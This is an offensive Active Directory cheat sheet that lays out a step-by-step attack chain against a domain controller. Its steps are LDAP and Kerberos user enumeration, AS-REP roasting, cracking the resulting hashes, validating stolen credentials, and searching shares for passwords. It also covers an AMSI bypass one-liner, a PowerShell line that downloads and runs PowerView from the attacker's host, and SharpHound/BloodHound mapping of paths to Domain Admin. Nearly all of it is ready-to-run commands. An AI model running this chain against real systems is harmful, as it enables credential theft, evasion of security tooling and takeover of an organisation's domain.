# Active Directory
# LDAP + User Enum + AS-REP Roasting + BloodHound

> **Legend:**
> `[KALI]` = Run on attack machine
> `[WINDOWS]` = Run on victim/foothold machine
> `[EITHER]` = Run on both

---

## STEP 1 — LDAP Enumeration (Port 389)

### Anonymous Bind Check
`[KALI]`
```bash
ldapsearch -x -H ldap://DC_IP -b "" -s base
```

### Domain Base Extract
`[KALI]`
```bash
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local"
```

### Users — with description field
`[KALI]`
```bash
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName description memberOf
```

### Groups
`[KALI]`
```bash
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=group)" cn member
```

### Computers
`[KALI]`
```bash
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" "(objectClass=computer)" cn operatingSystem
```

---

## STEP 2 — ldapdomaindump

### Anonymous
`[KALI]`
```bash
ldapdomaindump -u '' -p '' ldap://DC_IP -o /tmp/ldap_dump/
```

### With Credentials
`[KALI]`
```bash
ldapdomaindump -u 'corp\username' -p 'password' ldap://DC_IP -o /tmp/ldap_dump/
```

### Open Output Files
`[KALI]`
```bash
firefox /tmp/ldap_dump/domain_users.html
firefox /tmp/ldap_dump/domain_groups.html
firefox /tmp/ldap_dump/domain_computers.html
```

### Flags to Look For in domain_users.html
| Flag | Meaning |
|------|---------|
| `DONT_REQUIRE_PREAUTH` | AS-REP Roastable |
| `PASSWD_NOTREQD` | Blank password possible |
| `ACCOUNTDISABLED` | Skip this user |

---

## STEP 3 — Kerbrute User Enumeration (Port 88)

### Install
`[KALI]`
```bash
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### User Enumeration
`[KALI]`
```bash
kerbrute userenum \
  --dc DC_IP \
  --domain corp.local \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -o kerbrute_users.txt
```

### Wordlist Locations
`[KALI]`
```bash
/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
/usr/share/seclists/Usernames/Names/names.txt
```

---

## STEP 4 — Build Final User List

### Combine All Sources
`[KALI]`
```bash
# From rpcclient (Part 1A)
rpcclient -U "" -N DC_IP -c "enumdomusers" \
  | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > rpc_users.txt

# From ldapsearch
ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local" \
  "(objectClass=user)" sAMAccountName \
  | grep sAMAccountName | awk '{print $2}' > ldap_users.txt

# Merge + deduplicate
cat rpc_users.txt ldap_users.txt kerbrute_users.txt | sort -u > userlist.txt

# Check count
wc -l userlist.txt
```

---

## STEP 5 — AS-REP Roasting

### GetNPUsers — With Userlist (No Creds)
`[KALI]`
```bash
impacket-GetNPUsers corp.local/ \
  -usersfile userlist.txt \
  -dc-ip DC_IP \
  -no-pass \
  -outputfile asrep_hashes.txt
```

### GetNPUsers — Anonymous LDAP (No Userlist Needed)
`[KALI]`
```bash
impacket-GetNPUsers corp.local/ \
  -dc-ip DC_IP \
  -no-pass \
  -request
```

### GetNPUsers — With Credentials
`[KALI]`
```bash
impacket-GetNPUsers corp.local/username:password \
  -dc-ip DC_IP \
  -request \
  -outputfile asrep_hashes.txt
```

### Rubeus (if Windows foothold)
`[WINDOWS]`
```cmd
Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt
Rubeus.exe asreproast /user:svc_backup /format:hashcat
```

---

## STEP 6 — Crack AS-REP Hash

### Hashcat — Mode 18200
`[KALI]`
```bash
# Basic
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (more powerful)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 18200 asrep_hashes.txt --show
```

### John the Ripper
`[KALI]`
```bash
john asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john asrep_hashes.txt --show
```

### If Not Cracking — Try These
`[KALI]`
```bash
# Bigger wordlist
hashcat -m 18200 asrep_hashes.txt \
  /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

# CeWL — custom wordlist from target website
cewl http://corp.local -w custom.txt
hashcat -m 18200 asrep_hashes.txt custom.txt

# Multiple rules
hashcat -m 18200 asrep_hashes.txt rockyou.txt \
  -r best64.rule -r toggles1.rule
```

---

## STEP 7 — Validate Credentials

### SMB Validate
`[KALI]`
```bash
nxc smb DC_IP -u username -p 'password' -d corp.local
```

### Check All Protocols
`[KALI]`
```bash
# WinRM
nxc winrm DC_IP -u username -p 'password'

# RDP
nxc rdp DC_IP -u username -p 'password'

# SMB on all hosts
nxc smb 192.168.1.0/24 -u username -p 'password'
```

### Output Meanings
| Output | Meaning |
|--------|---------|
| `[+] corp\user:pass` | Valid credentials |
| `(Pwn3d!)` | Local admin on that machine |
| `STATUS_LOGON_FAILURE` | Wrong password |
| `STATUS_ACCOUNT_LOCKED_OUT` | Account locked — stop! |

---

## STEP 8 — Authenticated SMB Enum

### List Shares with Creds
`[KALI]`
```bash
nxc smb DC_IP -u username -p 'password' --shares
smbmap -u username -p 'password' -d corp.local -H DC_IP
```

### Browse Share
`[KALI]`
```bash
smbclient //DC_IP/ShareName -U 'corp/username%password'
```

### Recursive File List
`[KALI]`
```bash
smbmap -u username -p 'password' -H DC_IP -R ShareName
```

### Grep for Passwords
`[KALI]`
```bash
sudo mkdir /mnt/smb
sudo mount -t cifs //DC_IP/ShareName /mnt/smb \
  -o username=user,password=pass,domain=corp.local

grep -ri "password" /mnt/smb/
grep -ri "passwd" /mnt/smb/
grep -ri "secret" /mnt/smb/
```

---

## STEP 9 — PowerView

### Upload to Target
`[KALI]`
```bash
# Via evil-winrm
evil-winrm -i VICTIM_IP -u username -p 'password'
*Evil-WinRM* PS> upload /opt/PowerView.ps1
```

### AMSI Bypass — Run First!
`[WINDOWS]`
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Load PowerView
`[WINDOWS]`
```powershell
Import-Module .\PowerView.ps1

# Or direct from Kali (start python server first)
IEX (New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
```

### Start Python Server on Kali
`[KALI]`
```bash
python3 -m http.server 80
```

### PowerView Commands
`[WINDOWS]`
```powershell
# Domain info
Get-NetDomain

# DC info
Get-NetDomainController

# All users + description
Get-NetUser | select samaccountname, description, pwdlastset

# AS-REP Roastable users
Get-NetUser -PreauthNotRequired | select samaccountname

# Kerberoastable users (SPN)
Get-NetUser -SPN | select samaccountname, serviceprincipalname

# All groups
Get-NetGroup | select name

# Domain Admins members
Get-NetGroupMember "Domain Admins" | select MemberName

# All computers
Get-NetComputer | select name, operatingsystem

# WHERE ARE YOU LOCAL ADMIN — GOLD COMMAND
Find-LocalAdminAccess

# Who is logged in on a machine
Get-NetSession -ComputerName DC01

# ACL check on a user
Get-ObjectAcl -Identity "john.doe" -ResolveGUIDs

# Find interesting files in shares
Find-InterestingDomainShareFile
```

---

## STEP 10 — Legacy Net Commands (No PowerView)

`[WINDOWS]`
```cmd
net user /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net accounts /domain
net user john.doe /domain
```

---

## STEP 11 — BloodHound Setup

### Start Neo4j + BloodHound
`[KALI]`
```bash
sudo neo4j start
# Browser: http://localhost:7474
# Default: neo4j / neo4j → change to neo4j / bloodhound

bloodhound &
```

### Fix Neo4j Not Starting
`[KALI]`
```bash
sudo systemctl status neo4j
sudo apt install default-jdk
sudo neo4j start
```

---

## STEP 12 — SharpHound Data Collection

### Upload SharpHound
`[KALI]`
```bash
evil-winrm -i VICTIM_IP -u username -p 'password'
*Evil-WinRM* PS> upload /opt/SharpHound.exe
```

### Run Collection
`[WINDOWS]`
```powershell
.\SharpHound.exe -c All
.\SharpHound.exe -c All,GPOLocalGroup
```

### Download ZIP Back to Kali
`[WINDOWS → KALI]`
```powershell
*Evil-WinRM* PS> download 20240115_BloodHound.zip /tmp/
```

---

## STEP 13 — bloodhound-python (No Windows Foothold)

`[KALI]`
```bash
# Install
pip install bloodhound

# Run directly from Kali
bloodhound-python \
  -u username \
  -p 'password' \
  -d corp.local \
  -dc DC01.corp.local \
  -ns DC_IP \
  -c All \
  --zip
```

---

## STEP 14 — BloodHound Queries

```
BloodHound UI → Analysis Tab → Pre-Built Queries
```

| Query | Use |
|-------|-----|
| Find Shortest Paths to Domain Admins | Main attack path |
| List all Kerberoastable Accounts | Part 2 targets |
| Find AS-REP Roastable Users | Cross-check |
| Find Computers where Domain Users are Local Admin | Direct access |
| Shortest Path from Owned Principals | Path from your account |
| Find Principals with DCSync Rights | DCSync possible? |

### Mark Account as Owned
```
Search username → Right Click → Mark as Owned
Then run: Shortest Path from Owned Principals
```

### BloodHound Edge Types
| Edge | Meaning | Priority |
|------|---------|----------|
| `MemberOf` | Group membership | Low |
| `AdminTo` | Local admin access | High |
| `HasSession` | DA logged in there | Very High |
| `GenericAll` | Full control over object | Critical |
| `WriteDACL` | Can modify permissions | Very High |
| `DCSync` | Can dump all hashes | Game Over |

---

## Quick Reference — Attack Flow Part 1B

```
ldapsearch anonymous
        ↓
ldapdomaindump → check DONT_REQUIRE_PREAUTH flag
        ↓
kerbrute userenum → valid users
        ↓
combine all users → userlist.txt
        ↓
GetNPUsers.py → asrep_hashes.txt
        ↓
hashcat -m 18200 → crack password
        ↓
nxc smb validate → Pwn3d! ?
        ↓
evil-winrm shell → PowerView → Find-LocalAdminAccess
        ↓
SharpHound / bloodhound-python → import → Shortest Path to DA
```

---

## Tools Install — Quick Check

`[KALI]`
```bash
which ldapsearch ldapdomaindump kerbrute impacket-GetNPUsers hashcat john nxc evil-winrm bloodhound-python

# Install missing
sudo apt install ldap-utils
pip install ldapdomaindump
pip install bloodhound
pip install impacket
sudo apt install evil-winrm
sudo apt install bloodhound
```

---

*Part 1B — LDAP + AS-REP Roasting + BloodHound*
*Next → Part 2: Kerberoasting + Pass-the-Hash + Lateral Movement*
